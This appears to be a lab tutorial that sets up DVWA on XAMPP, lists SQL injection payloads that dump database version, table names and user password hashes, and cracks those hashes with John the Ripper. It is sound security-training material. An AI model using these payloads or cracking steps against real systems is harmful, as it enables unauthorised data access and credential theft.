1. Download DVWA, then extract it to a folder called 'DVWA' in the htdocs folder of XAMPP.
2. Link is localhost/DVWA/ (make sure XAMPP is running; it will not open anyway)
3. Rename the file called config.inc.php.dist in the config folder to config.inc.php (change to php)
4. Now open phpMyAdmin, then create a database called 'dvwa', then create new user credentials with 'dvwa' as user and 'p@ssw0rd' as password.
5. Now reload the application, and then just click the 'Login' button.
6. Scroll down, then run the button called 'Create/Reset Database'. It must be successfully done.
7. Now go back to login page (localhost/DVWA/login.php) - Username: admin and Password: password
8. Go back to the config file, search for this text called: $_DVWA[ 'default_security_level' ] and set it's value to 'low'
9. Save changes and reload once again, check DVWA Security for the changes (should be low)
10. Access the SQL Injection button and you're good to go.

Run these commands to test the SQL injection:
1. Basic injection: any number from 1-5; individual user's data is shown.
   Here, id is being exploited: $getid = "SELECT first_name, last_name FROM users WHERE user_id = '$id'"

2. Always true scenario: %' or '0'='0 (display all record that are false and all records that are true) 
   Here, mysql> SELECT first_name, last_name FROM users WHERE user_id = '%' or '0'='0'

3. Display DB version: %' or 0=0 union select null, version() # (last surname value has the db version)

4. Display DB user: %' or 0=0 union select null, user() # (last surname value has the name)

5. Display DB name: %' or 0=0 union select null, database() # (last surname value has the name)

6. Display all tables in info_schema: %' and 1=0 union select null, table_name from information_schema.tables #

7. Display all the columns field contents in the information_schema user table: %' and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #

Now, we can use John to crack one of the passwords
1. From the 7th command results; copy for a user the last two lines
2. Save it in a text file in this format: <name>:<hashcode>. Can also paste multiple user info like this, next to next in line.
3. Let's say the text file is named as dvwa_password.text
4. Run: john --format=raw-MD5 dvwa_password.txt (inside run folder, same folder has the text file also)
5. Run: john --show dvwa_password.txt to view the cracked passwords.
